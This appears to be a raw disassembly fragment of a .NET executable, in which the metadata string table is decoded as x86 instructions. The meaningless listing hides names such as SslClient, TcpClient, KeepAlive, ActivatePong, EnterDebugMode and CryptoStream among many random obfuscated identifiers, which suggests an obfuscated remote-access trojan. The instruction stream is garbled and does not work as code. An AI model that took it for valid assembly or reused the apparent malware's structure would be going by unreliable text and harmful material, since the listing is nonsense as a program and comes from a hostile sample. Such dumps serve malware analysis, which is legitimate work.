  40806d:	5a                   	pop    %edx
  40806e:	57                   	push   %edi
  40806f:	75 66                	jne    0x4080d7
  408071:	6d                   	insl   (%dx),%es:(%edi)
  408072:	58                   	pop    %eax
  408073:	58                   	pop    %eax
  408074:	6c                   	insb   (%dx),%es:(%edi)
  408075:	4b                   	dec    %ebx
  408076:	57                   	push   %edi
  408077:	00 4f 78             	add    %cl,0x78(%edi)
  40807a:	63 71 54             	arpl   %esi,0x54(%ecx)
  40807d:	6c                   	insb   (%dx),%es:(%edi)
  40807e:	73 54                	jae    0x4080d4
  408080:	50                   	push   %eax
  408081:	51                   	push   %ecx
  408082:	57                   	push   %edi
  408083:	00 49 65             	add    %cl,0x65(%ecx)
  408086:	59                   	pop    %ecx
  408087:	4a                   	dec    %edx
  408088:	5a                   	pop    %edx
  408089:	50                   	push   %eax
  40808a:	65 68 77 4f 63 53    	gs push $0x53634f77
  408090:	59                   	pop    %ecx
  408091:	57                   	push   %edi
  408092:	00 75 49             	add    %dh,0x49(%ebp)
  408095:	47                   	inc    %edi
  408096:	43                   	inc    %ebx
  408097:	70 53                	jo     0x4080ec
  408099:	78 6c                	js     0x408107
  40809b:	6e                   	outsb  %ds:(%esi),(%dx)
  40809c:	57                   	push   %edi
  40809d:	00 6a 62             	add    %ch,0x62(%edx)
  4080a0:	44                   	inc    %esp
  4080a1:	4e                   	dec    %esi
  4080a2:	75 73                	jne    0x408117
  4080a4:	4e                   	dec    %esi
  4080a5:	7a 41                	jp     0x4080e8
  4080a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a8:	6b 64 72 57 00       	imul   $0x0,0x57(%edx,%esi,2),%esp
  4080ad:	47                   	inc    %edi
  4080ae:	66 46                	inc    %si
  4080b0:	4e                   	dec    %esi
  4080b1:	73 7a                	jae    0x40812d
  4080b3:	54                   	push   %esp
  4080b4:	50                   	push   %eax
  4080b5:	73 70                	jae    0x408127
  4080b7:	74 7a                	je     0x408133
  4080b9:	43                   	inc    %ebx
  4080ba:	58                   	pop    %eax
  4080bb:	00 56 66             	add    %dl,0x66(%esi)
  4080be:	6e                   	outsb  %ds:(%esi),(%dx)
  4080bf:	7a 54                	jp     0x408115
  4080c1:	4d                   	dec    %ebp
  4080c2:	4a                   	dec    %edx
  4080c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c4:	44                   	inc    %esp
  4080c5:	58                   	pop    %eax
  4080c6:	00 4c 4b 6f          	add    %cl,0x6f(%ebx,%ecx,2)
  4080ca:	63 74 6d 4d          	arpl   %esi,0x4d(%ebp,%ebp,2)
  4080ce:	62 48 58             	bound  %ecx,0x58(%eax)
  4080d1:	00 54 41 73          	add    %dl,0x73(%ecx,%eax,2)
  4080d5:	68 4c 50 68 6d       	push   $0x6d68504c
  4080da:	6a 71                	push   $0x71
  4080dc:	56                   	push   %esi
  4080dd:	44                   	inc    %esp
  4080de:	49                   	dec    %ecx
  4080df:	58                   	pop    %eax
  4080e0:	00 70 52             	add    %dh,0x52(%eax)
  4080e3:	75 76                	jne    0x40815b
  4080e5:	64 70 67             	fs jo  0x40814f
  4080e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4080e9:	59                   	pop    %ecx
  4080ea:	41                   	inc    %ecx
  4080eb:	4d                   	dec    %ebp
  4080ec:	58                   	pop    %eax
  4080ed:	00 54 67 49          	add    %dl,0x49(%edi,%eiz,2)
  4080f1:	4e                   	dec    %esi
  4080f2:	66 73 74             	data16 jae 0x408169
  4080f5:	78 58                	js     0x40814f
  4080f7:	4d                   	dec    %ebp
  4080f8:	58                   	pop    %eax
  4080f9:	00 76 53             	add    %dh,0x53(%esi)
  4080fc:	69 46 74 6d 78 73 6a 	imul   $0x6a73786d,0x74(%esi),%eax
  408103:	56                   	push   %esi
  408104:	52                   	push   %edx
  408105:	58                   	pop    %eax
  408106:	00 77 50             	add    %dh,0x50(%edi)
  408109:	6a 6a                	push   $0x6a
  40810b:	61                   	popa
  40810c:	54                   	push   %esp
  40810d:	68 61 48 7a 58       	push   $0x587a4861
  408112:	00 64 76 53          	add    %ah,0x53(%esi,%esi,2)
  408116:	50                   	push   %eax
  408117:	51                   	push   %ecx
  408118:	7a 48                	jp     0x408162
  40811a:	4d                   	dec    %ebp
  40811b:	68 41 59 00 67       	push   $0x67005941
  408120:	78 62                	js     0x408184
  408122:	69 4d 6d 62 4f 65 5a 	imul   $0x5a654f62,0x6d(%ebp),%ecx
  408129:	50                   	push   %eax
  40812a:	4b                   	dec    %ebx
  40812b:	6a 4c                	push   $0x4c
  40812d:	59                   	pop    %ecx
  40812e:	00 71 6b             	add    %dh,0x6b(%ecx)
  408131:	47                   	inc    %edi
  408132:	6a 6d                	push   $0x6d
  408134:	4d                   	dec    %ebp
  408135:	70 67                	jo     0x40819e
  408137:	77 50                	ja     0x408189
  408139:	59                   	pop    %ecx
  40813a:	00 6a 75             	add    %ch,0x75(%edx)
  40813d:	75 70                	jne    0x4081af
  40813f:	41                   	inc    %ecx
  408140:	5a                   	pop    %edx
  408141:	45                   	inc    %ebp
  408142:	44                   	inc    %esp
  408143:	43                   	inc    %ebx
  408144:	57                   	push   %edi
  408145:	6a 6e                	push   $0x6e
  408147:	64 51                	fs push %ecx
  408149:	59                   	pop    %ecx
  40814a:	00 44 67 6a          	add    %al,0x6a(%edi,%eiz,2)
  40814e:	63 77 6d             	arpl   %esi,0x6d(%edi)
  408151:	4e                   	dec    %esi
  408152:	4b                   	dec    %ebx
  408153:	69 77 55 4c 56 59 00 	imul   $0x59564c,0x55(%edi),%esi
  40815a:	54                   	push   %esp
  40815b:	41                   	inc    %ecx
  40815c:	4f                   	dec    %edi
  40815d:	74 4b                	je     0x4081aa
  40815f:	7a 6c                	jp     0x4081cd
  408161:	6a 6d                	push   $0x6d
  408163:	77 46                	ja     0x4081ab
  408165:	4d                   	dec    %ebp
  408166:	57                   	push   %edi
  408167:	59                   	pop    %ecx
  408168:	00 4f 75             	add    %cl,0x75(%edi)
  40816b:	6e                   	outsb  %ds:(%esi),(%dx)
  40816c:	58                   	pop    %eax
  40816d:	71 61                	jno    0x4081d0
  40816f:	45                   	inc    %ebp
  408170:	6c                   	insb   (%dx),%es:(%edi)
  408171:	44                   	inc    %esp
  408172:	51                   	push   %ecx
  408173:	73 66                	jae    0x4081db
  408175:	59                   	pop    %ecx
  408176:	00 67 50             	add    %ah,0x50(%edi)
  408179:	4c                   	dec    %esp
  40817a:	76 48                	jbe    0x4081c4
  40817c:	78 59                	js     0x4081d7
  40817e:	66 5a                	pop    %dx
  408180:	73 59                	jae    0x4081db
  408182:	00 42 66             	add    %al,0x66(%edx)
  408185:	41                   	inc    %ecx
  408186:	75 76                	jne    0x4081fe
  408188:	72 78                	jb     0x408202
  40818a:	45                   	inc    %ebp
  40818b:	45                   	inc    %ebp
  40818c:	62 48 5a             	bound  %ecx,0x5a(%eax)
  40818f:	00 73 6c             	add    %dh,0x6c(%ebx)
  408192:	70 6e                	jo     0x408202
  408194:	4d                   	dec    %ebp
  408195:	57                   	push   %edi
  408196:	53                   	push   %ebx
  408197:	65 53                	gs push %ebx
  408199:	59                   	pop    %ecx
  40819a:	74 41                	je     0x4081dd
  40819c:	52                   	push   %edx
  40819d:	5a                   	pop    %edx
  40819e:	00 69 7a             	add    %ch,0x7a(%ecx)
  4081a1:	64 7a 57             	fs jp  0x4081fb
  4081a4:	61                   	popa
  4081a5:	45                   	inc    %ebp
  4081a6:	4d                   	dec    %ebp
  4081a7:	69 61 5a 00 65 42 6e 	imul   $0x6e426500,0x5a(%ecx),%esp
  4081ae:	57                   	push   %edi
  4081af:	67 6e                	outsb  %ds:(%si),(%dx)
  4081b1:	63 6a 56             	arpl   %ebp,0x56(%edx)
  4081b4:	75 47                	jne    0x4081fd
  4081b6:	64 5a                	fs pop %edx
  4081b8:	00 6b 59             	add    %ch,0x59(%ebx)
  4081bb:	6d                   	insl   (%dx),%es:(%edi)
  4081bc:	66 47                	inc    %di
  4081be:	53                   	push   %ebx
  4081bf:	4d                   	dec    %ebp
  4081c0:	74 77                	je     0x408239
  4081c2:	5a                   	pop    %edx
  4081c3:	68 59 50 4b 57       	push   $0x574b5059
  4081c8:	73 72                	jae    0x40823c
  4081ca:	5a                   	pop    %edx
  4081cb:	00 76 61             	add    %dh,0x61(%esi)
  4081ce:	6c                   	insb   (%dx),%es:(%edi)
  4081cf:	75 65                	jne    0x408236
  4081d1:	5f                   	pop    %edi
  4081d2:	5f                   	pop    %edi
  4081d3:	00 7a 51             	add    %bh,0x51(%edx)
  4081d6:	62 68 4b             	bound  %ebp,0x4b(%eax)
  4081d9:	4d                   	dec    %ebp
  4081da:	65 66 62 63 74       	bound  %sp,%gs:0x74(%ebx)
  4081df:	55                   	push   %ebp
  4081e0:	61                   	popa
  4081e1:	00 69 56             	add    %ch,0x56(%ecx)
  4081e4:	47                   	inc    %edi
  4081e5:	76 70                	jbe    0x408257
  4081e7:	66 46                	inc    %si
  4081e9:	7a 79                	jp     0x408264
  4081eb:	50                   	push   %eax
  4081ec:	73 66                	jae    0x408254
  4081ee:	5a                   	pop    %edx
  4081ef:	61                   	popa
  4081f0:	00 66 78             	add    %ah,0x78(%esi)
  4081f3:	6c                   	insb   (%dx),%es:(%edi)
  4081f4:	4f                   	dec    %edi
  4081f5:	76 6f                	jbe    0x408266
  4081f7:	4b                   	dec    %ebx
  4081f8:	47                   	inc    %edi
  4081f9:	48                   	dec    %eax
  4081fa:	61                   	popa
  4081fb:	61                   	popa
  4081fc:	00 74 72 76          	add    %dh,0x76(%edx,%esi,2)
  408200:	58                   	pop    %eax
  408201:	45                   	inc    %ebp
  408202:	6c                   	insb   (%dx),%es:(%edi)
  408203:	58                   	pop    %eax
  408204:	76 4c                	jbe    0x408252
  408206:	4c                   	dec    %esp
  408207:	64 61                	fs popa
  408209:	00 55 7a             	add    %dl,0x7a(%ebp)
  40820c:	6f                   	outsl  %ds:(%esi),(%dx)
  40820d:	70 78                	jo     0x408287
  40820f:	62 44 6b 4d          	bound  %eax,0x4d(%ebx,%ebp,2)
  408213:	62 00                	bound  %eax,(%eax)
  408215:	4e                   	dec    %esi
  408216:	46                   	inc    %esi
  408217:	4c                   	dec    %esp
  408218:	44                   	inc    %esp
  408219:	7a 55                	jp     0x408270
  40821b:	57                   	push   %edi
  40821c:	66 6c                	data16 insb (%dx),%es:(%edi)
  40821e:	4d                   	dec    %ebp
  40821f:	62 00                	bound  %eax,(%eax)
  408221:	53                   	push   %ebx
  408222:	74 65                	je     0x408289
  408224:	57                   	push   %edi
  408225:	4c                   	dec    %esp
  408226:	46                   	inc    %esi
  408227:	59                   	pop    %ecx
  408228:	4e                   	dec    %esi
  408229:	4d                   	dec    %ebp
  40822a:	43                   	inc    %ebx
  40822b:	61                   	popa
  40822c:	62 00                	bound  %eax,(%eax)
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	73 63                	jae    0x408294
  408231:	6f                   	outsl  %ds:(%esi),(%dx)
  408232:	72 6c                	jb     0x4082a0
  408234:	69 62 00 4e 78 71 6f 	imul   $0x6f71784e,0x0(%edx),%esp
  40823b:	6f                   	outsl  %ds:(%esi),(%dx)
  40823c:	42                   	inc    %edx
  40823d:	56                   	push   %esi
  40823e:	65 47                	gs inc %edi
  408240:	53                   	push   %ebx
  408241:	6c                   	insb   (%dx),%es:(%edi)
  408242:	62 00                	bound  %eax,(%eax)
  408244:	76 75                	jbe    0x4082bb
  408246:	46                   	inc    %esi
  408247:	4e                   	dec    %esi
  408248:	7a 55                	jp     0x40829f
  40824a:	52                   	push   %edx
  40824b:	4a                   	dec    %edx
  40824c:	4a                   	dec    %edx
  40824d:	48                   	dec    %eax
  40824e:	76 6a                	jbe    0x4082ba
  408250:	45                   	inc    %ebp
  408251:	6e                   	outsb  %ds:(%esi),(%dx)
  408252:	62 00                	bound  %eax,(%eax)
  408254:	74 43                	je     0x408299
  408256:	62 41 70             	bound  %eax,0x70(%ecx)
  408259:	5a                   	pop    %edx
  40825a:	6a 75                	push   $0x75
  40825c:	71 76                	jno    0x4082d4
  40825e:	62 00                	bound  %eax,(%eax)
  408260:	48                   	dec    %eax
  408261:	4a                   	dec    %edx
  408262:	52                   	push   %edx
  408263:	54                   	push   %esp
  408264:	4b                   	dec    %ebx
  408265:	4b                   	dec    %ebx
  408266:	4e                   	dec    %esi
  408267:	65 6e                	outsb  %gs:(%esi),(%dx)
  408269:	78 42                	js     0x4082ad
  40826b:	63 00                	arpl   %eax,(%eax)
  40826d:	76 57                	jbe    0x4082c6
  40826f:	41                   	inc    %ecx
  408270:	6d                   	insl   (%dx),%es:(%edi)
  408271:	4c                   	dec    %esp
  408272:	4e                   	dec    %esi
  408273:	46                   	inc    %esi
  408274:	47                   	inc    %edi
  408275:	6d                   	insl   (%dx),%es:(%edi)
  408276:	7a 73                	jp     0x4082eb
  408278:	59                   	pop    %ecx
  408279:	44                   	inc    %esp
  40827a:	63 00                	arpl   %eax,(%eax)
  40827c:	67 57                	addr16 push %edi
  40827e:	68 6f 76 50 59       	push   $0x5950766f
  408283:	51                   	push   %ecx
  408284:	4a                   	dec    %edx
  408285:	63 00                	arpl   %eax,(%eax)
  408287:	52                   	push   %edx
  408288:	4d                   	dec    %ebp
  408289:	53                   	push   %ebx
  40828a:	6c                   	insb   (%dx),%es:(%edi)
  40828b:	56                   	push   %esi
  40828c:	43                   	inc    %ebx
  40828d:	4a                   	dec    %edx
  40828e:	53                   	push   %ebx
  40828f:	4e                   	dec    %esi
  408290:	63 00                	arpl   %eax,(%eax)
  408292:	59                   	pop    %ecx
  408293:	62 61 66             	bound  %esp,0x66(%ecx)
  408296:	7a 79                	jp     0x408311
  408298:	56                   	push   %esi
  408299:	4a                   	dec    %edx
  40829a:	4c                   	dec    %esp
  40829b:	47                   	inc    %edi
  40829c:	63 45 52             	arpl   %eax,0x52(%ebp)
  40829f:	63 00                	arpl   %eax,(%eax)
  4082a1:	6a 55                	push   $0x55
  4082a3:	7a 6e                	jp     0x408313
  4082a5:	45                   	inc    %ebp
  4082a6:	74 59                	je     0x408301
  4082a8:	44                   	inc    %esp
  4082a9:	4c                   	dec    %esp
  4082aa:	70 4a                	jo     0x4082f6
  4082ac:	5a                   	pop    %edx
  4082ad:	54                   	push   %esp
  4082ae:	63 00                	arpl   %eax,(%eax)
  4082b0:	41                   	inc    %ecx
  4082b1:	75 6f                	jne    0x408322
  4082b3:	54                   	push   %esp
  4082b4:	54                   	push   %esp
  4082b5:	62 54 59 4b          	bound  %edx,0x4b(%ecx,%ebx,2)
  4082b9:	47                   	inc    %edi
  4082ba:	78 58                	js     0x408314
  4082bc:	63 00                	arpl   %eax,(%eax)
  4082be:	71 61                	jno    0x408321
  4082c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c1:	5a                   	pop    %edx
  4082c2:	64 66 66 6b 76 5a 63 	data16 imul $0x63,%fs:0x5a(%esi),%si
  4082c9:	00 42 6e             	add    %al,0x6e(%edx)
  4082cc:	74 4b                	je     0x408319
  4082ce:	51                   	push   %ecx
  4082cf:	75 75                	jne    0x408346
  4082d1:	6c                   	insb   (%dx),%es:(%edi)
  4082d2:	46                   	inc    %esi
  4082d3:	44                   	inc    %esp
  4082d4:	50                   	push   %eax
  4082d5:	59                   	pop    %ecx
  4082d6:	62 63 00             	bound  %esp,0x0(%ebx)
  4082d9:	53                   	push   %ebx
  4082da:	79 73                	jns    0x40834f
  4082dc:	74 65                	je     0x408343
  4082de:	6d                   	insl   (%dx),%es:(%edi)
  4082df:	2e 43                	cs inc %ebx
  4082e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e2:	6c                   	insb   (%dx),%es:(%edi)
  4082e3:	6c                   	insb   (%dx),%es:(%edi)
  4082e4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4082e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4082ea:	73 2e                	jae    0x40831a
  4082ec:	47                   	inc    %edi
  4082ed:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082ef:	65 72 69             	gs jb  0x40835b
  4082f2:	63 00                	arpl   %eax,(%eax)
  4082f4:	4d                   	dec    %ebp
  4082f5:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4082fc:	74 2e                	je     0x40832c
  4082fe:	56                   	push   %esi
  4082ff:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408306:	73 69                	jae    0x408371
  408308:	63 00                	arpl   %eax,(%eax)
  40830a:	67 65 74 5f          	addr16 gs je 0x40836d
  40830e:	53                   	push   %ebx
  40830f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408311:	64 53                	fs push %ebx
  408313:	79 6e                	jns    0x408383
  408315:	63 00                	arpl   %eax,(%eax)
  408317:	67 69 76 52 43 73 46 	imul   $0x7a467343,0x52(%bp),%esi
  40831e:	7a 
  40831f:	6a 74                	push   $0x74
  408321:	63 00                	arpl   %eax,(%eax)
  408323:	74 62                	je     0x408387
  408325:	5a                   	pop    %edx
  408326:	6e                   	outsb  %ds:(%esi),(%dx)
  408327:	66 4a                	dec    %dx
  408329:	58                   	pop    %eax
  40832a:	47                   	inc    %edi
  40832b:	6b 4e 4f 59          	imul   $0x59,0x4f(%esi),%ecx
  40832f:	4a                   	dec    %edx
  408330:	43                   	inc    %ebx
  408331:	64 00 6f 6d          	add    %ch,%fs:0x6d(%edi)
  408335:	77 4c                	ja     0x408383
  408337:	6a 63                	push   $0x63
  408339:	48                   	dec    %eax
  40833a:	58                   	pop    %eax
  40833b:	51                   	push   %ecx
  40833c:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408340:	64 52                	fs push %edx
  408342:	65 61                	gs popa
  408344:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408348:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  40834f:	00 
  408350:	54                   	push   %esp
  408351:	68 72 65 61 64       	push   $0x64616572
  408356:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40835a:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  40835e:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  408362:	41                   	inc    %ecx
  408363:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  408369:	61                   	popa
  40836a:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  408370:	74 5f                	je     0x4083d1
  408372:	43                   	inc    %ebx
  408373:	6f                   	outsl  %ds:(%esi),(%dx)
  408374:	6e                   	outsb  %ds:(%esi),(%dx)
  408375:	6e                   	outsb  %ds:(%esi),(%dx)
  408376:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40837b:	00 67 65             	add    %ah,0x65(%edi)
  40837e:	74 5f                	je     0x4083df
  408380:	49                   	dec    %ecx
  408381:	73 43                	jae    0x4083c6
  408383:	6f                   	outsl  %ds:(%esi),(%dx)
  408384:	6e                   	outsb  %ds:(%esi),(%dx)
  408385:	6e                   	outsb  %ds:(%esi),(%dx)
  408386:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40838b:	00 73 65             	add    %dh,0x65(%ebx)
  40838e:	74 5f                	je     0x4083ef
  408390:	49                   	dec    %ecx
  408391:	73 43                	jae    0x4083d6
  408393:	6f                   	outsl  %ds:(%esi),(%dx)
  408394:	6e                   	outsb  %ds:(%esi),(%dx)
  408395:	6e                   	outsb  %ds:(%esi),(%dx)
  408396:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40839b:	00 67 65             	add    %ah,0x65(%edi)
  40839e:	74 5f                	je     0x4083ff
  4083a0:	47                   	inc    %edi
  4083a1:	75 69                	jne    0x40840c
  4083a3:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4083a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083a9:	64 53                	fs push %ebx
  4083ab:	79 6e                	jns    0x40841b
  4083ad:	63 3e                	arpl   %edi,(%esi)
  4083af:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4083b3:	61                   	popa
  4083b4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b8:	67 46                	addr16 inc %esi
  4083ba:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4083c1:	73 43                	jae    0x408406
  4083c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083cb:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4083d0:	61                   	popa
  4083d1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083d5:	67 46                	addr16 inc %esi
  4083d7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4083de:	65 65 70 41          	gs gs jo 0x408423
  4083e2:	6c                   	insb   (%dx),%es:(%edi)
  4083e3:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4083ea:	42                   	inc    %edx
  4083eb:	61                   	popa
  4083ec:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f0:	67 46                	addr16 inc %esi
  4083f2:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4083f9:	65 61                	gs popa
  4083fb:	64 65 72 53          	fs gs jb 0x408452
  4083ff:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408406:	42                   	inc    %edx
  408407:	61                   	popa
  408408:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40840b:	6e                   	outsb  %ds:(%esi),(%dx)
  40840c:	67 46                	addr16 inc %esi
  40840e:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  408415:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  40841c:	42                   	inc    %edx
  40841d:	61                   	popa
  40841e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408421:	6e                   	outsb  %ds:(%esi),(%dx)
  408422:	67 46                	addr16 inc %esi
  408424:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  40842b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40842f:	61                   	popa
  408430:	74 65                	je     0x408497
  408432:	50                   	push   %eax
  408433:	6f                   	outsl  %ds:(%esi),(%dx)
  408434:	6e                   	outsb  %ds:(%esi),(%dx)
  408435:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  40843b:	61                   	popa
  40843c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40843f:	6e                   	outsb  %ds:(%esi),(%dx)
  408440:	67 46                	addr16 inc %esi
  408442:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408449:	6e                   	outsb  %ds:(%esi),(%dx)
  40844a:	74 65                	je     0x4084b1
  40844c:	72 76                	jb     0x4084c4
  40844e:	61                   	popa
  40844f:	6c                   	insb   (%dx),%es:(%edi)
  408450:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408455:	61                   	popa
  408456:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408459:	6e                   	outsb  %ds:(%esi),(%dx)
  40845a:	67 46                	addr16 inc %esi
  40845c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408463:	75 66                	jne    0x4084cb
  408465:	66 65 72 3e          	data16 gs jb 0x4084a7
  408469:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40846d:	61                   	popa
  40846e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408471:	6e                   	outsb  %ds:(%esi),(%dx)
  408472:	67 46                	addr16 inc %esi
  408474:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40847b:	66 66 73 65          	data16 data16 jae 0x4084e4
  40847f:	74 3e                	je     0x4084bf
  408481:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408485:	61                   	popa
  408486:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408489:	6e                   	outsb  %ds:(%esi),(%dx)
  40848a:	67 46                	addr16 inc %esi
  40848c:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408493:	73 6c                	jae    0x408501
  408495:	43                   	inc    %ebx
  408496:	6c                   	insb   (%dx),%es:(%edi)
  408497:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40849e:	5f                   	pop    %edi
  40849f:	42                   	inc    %edx
  4084a0:	61                   	popa
  4084a1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a5:	67 46                	addr16 inc %esi
  4084a7:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4084ae:	63 70 43             	arpl   %esi,0x43(%eax)
  4084b1:	6c                   	insb   (%dx),%es:(%edi)
  4084b2:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4084b9:	5f                   	pop    %edi
  4084ba:	42                   	inc    %edx
  4084bb:	61                   	popa
  4084bc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c0:	67 46                	addr16 inc %esi
  4084c2:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  4084c9:	70 65                	jo     0x408530
  4084cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4084cc:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4084d0:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4084d7:	61 
  4084d8:	6c                   	insb   (%dx),%es:(%edi)
  4084d9:	75 65                	jne    0x408540
  4084db:	4b                   	dec    %ebx
  4084dc:	69 6e 64 00 4a 71 4a 	imul   $0x4a714a00,0x64(%esi),%ebp
  4084e3:	49                   	dec    %ecx
  4084e4:	62 5a 4d             	bound  %ebx,0x4d(%edx)
  4084e7:	54                   	push   %esp
  4084e8:	57                   	push   %edi
  4084e9:	68 79 78 64 00       	push   $0x647879
  4084ee:	6c                   	insb   (%dx),%es:(%edi)
  4084ef:	4f                   	dec    %edi
  4084f0:	47                   	inc    %edi
  4084f1:	63 75 6c             	arpl   %esi,0x6c(%ebp)
  4084f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f5:	56                   	push   %esi
  4084f6:	70 6b                	jo     0x408563
  4084f8:	79 48                	jns    0x408542
  4084fa:	5a                   	pop    %edx
  4084fb:	65 00 5a 53          	add    %bl,%gs:0x53(%edx)
  4084ff:	61                   	popa
  408500:	71 4c                	jno    0x40854e
  408502:	47                   	inc    %edi
  408503:	5a                   	pop    %edx
  408504:	62 64 58 48          	bound  %esp,0x48(%eax,%ebx,2)
  408508:	62 65 00             	bound  %esp,0x0(%ebp)
  40850b:	68 78 6c 78 69       	push   $0x69786c78
  408510:	71 5a                	jno    0x40856c
  408512:	48                   	dec    %eax
  408513:	66 4b                	dec    %bx
  408515:	63 65 00             	arpl   %esp,0x0(%ebp)
  408518:	52                   	push   %edx
  408519:	65 70 6c             	gs jo  0x408588
  40851c:	61                   	popa
  40851d:	63 65 00             	arpl   %esp,0x0(%ebp)
  408520:	43                   	inc    %ebx
  408521:	72 65                	jb     0x408588
  408523:	61                   	popa
  408524:	74 65                	je     0x40858b
  408526:	49                   	dec    %ecx
  408527:	6e                   	outsb  %ds:(%esi),(%dx)
  408528:	73 74                	jae    0x40859e
  40852a:	61                   	popa
  40852b:	6e                   	outsb  %ds:(%esi),(%dx)
  40852c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40852f:	44                   	inc    %esp
  408530:	6f                   	outsl  %ds:(%esi),(%dx)
  408531:	74 75                	je     0x4085a8
  408533:	67 41                	addr16 inc %ecx
  408535:	55                   	push   %ebp
  408536:	77 64                	ja     0x40859c
  408538:	78 63                	js     0x40859d
  40853a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40853e:	74 5f                	je     0x40859f
  408540:	4d                   	dec    %ebp
  408541:	6f                   	outsl  %ds:(%esi),(%dx)
  408542:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408547:	6c                   	insb   (%dx),%es:(%edi)
  408548:	65 4d                	gs dec %ebp
  40854a:	6f                   	outsl  %ds:(%esi),(%dx)
  40854b:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408550:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408557:	64 65 
  408559:	00 45 6e             	add    %al,0x6e(%ebp)
  40855c:	74 65                	je     0x4085c3
  40855e:	72 44                	jb     0x4085a4
  408560:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408564:	4d                   	dec    %ebp
  408565:	6f                   	outsl  %ds:(%esi),(%dx)
  408566:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40856b:	79 70                	jns    0x4085dd
  40856d:	74 6f                	je     0x4085de
  40856f:	53                   	push   %ebx
  408570:	74 72                	je     0x4085e4
  408572:	65 61                	gs popa
